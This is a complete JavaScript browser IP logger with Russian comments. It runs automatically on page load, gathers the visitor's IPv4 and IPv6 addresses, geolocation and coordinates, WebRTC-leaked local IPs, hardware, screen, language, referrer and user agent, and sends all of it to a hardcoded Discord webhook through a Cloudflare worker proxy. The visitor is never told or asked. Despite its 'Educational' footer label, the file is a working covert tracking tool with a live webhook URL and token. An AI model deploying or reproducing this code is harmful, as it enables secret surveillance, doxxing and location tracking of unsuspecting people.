// ================== НАСТРОЙКИ ==================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1568934373611413606/CrpWp7F7muDIhsSkcxFJ2qWD8dclJ-MfuN2oj626Iz49oBTZUP8Tn2MD0eJb0UQQOwRb";
const WORKER_URL  = "https://wispy-bar-366f.afdsafdsaf32.workers.dev";
// ================================================

async function safeFetch(url, ms = 4000) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), ms);
    try {
        const r = await fetch(url, { signal: ctrl.signal });
        clearTimeout(t);
        if (!r.ok) return null;
        return await r.json();
    } catch {
        clearTimeout(t);
        return null;
    }
}

async function collectAndSend() {
    try {
        // IP: v4 и v6 параллельно
        const [v4, v6, geo] = await Promise.all([
            safeFetch("https://api.ipify.org?format=json"),
            safeFetch("https://api6.ipify.org?format=json"),
            safeFetch("https://ipapi.co/json/"),
        ]);

        // Батарея
        let battery = "N/A";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}%${b.charging ? " ⚡" : ""}`;
            } catch {}
        }

        // WebRTC leak
        const webrtc = await new Promise(resolve => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                const ips = new Set();
                pc.createDataChannel("");
                pc.onicecandidate = e => {
                    if (!e.candidate) { pc.close(); resolve([...ips].join(", ") || "нет"); return; }
                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7}/i);
                    if (m) ips.add(m[0]);
                };
                pc.createOffer().then(o => pc.setLocalDescription(o));
                setTimeout(() => { try { pc.close(); } catch {} resolve([...ips].join(", ") || "таймаут"); }, 2500);
            } catch { resolve("N/A"); }
        });

        // GPU
        let gpu = "N/A";
        try {
            const c = document.createElement("canvas");
            const gl = c.getContext("webgl");
            const dbg = gl?.getExtension("WEBGL_debug_renderer_info");
            if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        } catch {}

        // Сеть
        const conn = navigator.connection;
        const net = conn ? `${conn.effectiveType || "?"} / ${conn.downlink || "?"} Mbps / RTT ${conn.rtt || "?"}` : "N/A";

        // Отправляем
        await send(v4, v6, geo || {}, battery, webrtc, gpu, net);
    } catch (e) {
        console.error("Ошибка:", e);
    }
}

async function send(v4, v6, g, battery, webrtc, gpu, net) {
    // Собираем ВСЕ поля в массив
    const allFields = [
        { name: "🌐 IPv4", value: "`" + (v4?.ip || "нет") + "`", inline: true },
        { name: "🌐 IPv6", value: "`" + (v6?.ip || "нет") + "`", inline: true },
        { name: "📍 IP (гео)", value: "`" + (g.ip || "?") + "`", inline: true },
        { name: "🌍 Страна", value: `${g.country_name || "?"} (${g.country_code || "?"})`, inline: true },
        { name: "🏙️ Город", value: g.city || "?", inline: true },
        { name: "🗺️ Регион", value: g.region || "?", inline: true },
        { name: "📮 Индекс", value: g.postal || "?", inline: true },
        { name: "🧭 Координаты", value: `${g.latitude || "?"}, ${g.longitude || "?"}`, inline: false },
        { name: "🗺️ Карта", value: (g.latitude && g.longitude) ? `[Google Maps](https://www.google.com/maps?q=${g.latitude},${g.longitude})` : "нет", inline: false },
        { name: "🏢 Провайдер", value: g.org || "?", inline: false },
        { name: "🔢 ASN", value: g.asn || "?", inline: true },
        { name: "🌐 Континент", value: g.continent_code || "?", inline: true },
        { name: "🕐 Часовой пояс", value: g.timezone || "?", inline: true },
        { name: "💰 Валюта", value: g.currency || "?", inline: true },
        { name: "🕒 Локальное время", value: new Date().toLocaleString("ru-RU"), inline: true },
        { name: "💻 ОС / Платформа", value: navigator.platform || "?", inline: true },
        { name: "🏷️ Вендор", value: navigator.vendor || "?", inline: true },
        { name: "⚙️ CPU ядер", value: `${navigator.hardwareConcurrency || "?"}`, inline: true },
        { name: "🧠 RAM", value: `${navigator.deviceMemory || "?"} GB`, inline: true },
        { name: "📱 Touch points", value: `${navigator.maxTouchPoints || 0}`, inline: true },
        { name: "🎮 GPU", value: gpu.slice(0, 100), inline: false },
        { name: "🖥️ Экран", value: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`, inline: true },
        { name: "🖥️ Доступно", value: `${screen.availWidth}x${screen.availHeight}`, inline: true },
        { name: "🔍 Pixel ratio", value: `${window.devicePixelRatio || 1}`, inline: true },
        { name: "🪟 Окно", value: `${innerWidth}x${innerHeight}`, inline: true },
        { name: "🔄 Ориентация", value: screen.orientation?.type || "?", inline: true },
        { name: "🌍 Язык", value: navigator.language || "?", inline: true },
        { name: "🌍 Все языки", value: (navigator.languages || []).join(", "), inline: false },
        { name: "🔋 Батарея", value: battery, inline: true },
        { name: "📶 Сеть", value: net, inline: false },
        { name: "🍪 Cookies", value: navigator.cookieEnabled ? "вкл" : "выкл", inline: true },
        { name: "📡 Online", value: navigator.onLine ? "да" : "нет", inline: true },
        { name: "🕵️ DNT", value: navigator.doNotTrack || "не задан", inline: true },
        { name: "🚨 WebRTC leak", value: "`" + webrtc + "`", inline: false },
        { name: "🔗 Referrer", value: document.referrer || "прямой заход", inline: false },
        { name: "📄 Страница", value: location.href, inline: false },
        { name: "🧾 User-Agent", value: "```" + navigator.userAgent.slice(0, 1000) + "```", inline: false },
    ];

    // Discord: макс 25 полей на embed, макс 10 embeds на сообщение
    // Режем на 3 embed'а по ~13 полей — с запасом, чтобы точно не упасть по лимиту символов
    const embeds = [];
    const perEmbed = 13;
    for (let i = 0; i < allFields.length; i += perEmbed) {
        const chunk = allFields.slice(i, i + perEmbed);
        embeds.push({
            title: i === 0 ? "🐱 Новый посетитель!" : `Часть ${embeds.length + 1}`,
            color: 0x764ba2,
            fields: chunk,
            timestamp: i === 0 ? new Date().toISOString() : undefined,
            footer: i + perEmbed >= allFields.length ? { text: "Educational IP Logger • IPv4+IPv6" } : undefined,
        });
    }

    const payload = {
        username: "🐱 Котик-логгер",
        embeds,
    };

    const target = `${WORKER_URL}?webhook=${encodeURIComponent(WEBHOOK_URL)}`;

    const r = await fetch(target, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    });

    if (!r.ok) {
        const txt = await r.text();
        console.error("❌ Discord отказал:", r.status);
        console.error("Текст ошибки:", txt);
    } else {
        console.log("✅ Отправлено в Discord");
    }
}

window.addEventListener("load", () => setTimeout(collectAndSend, 500));
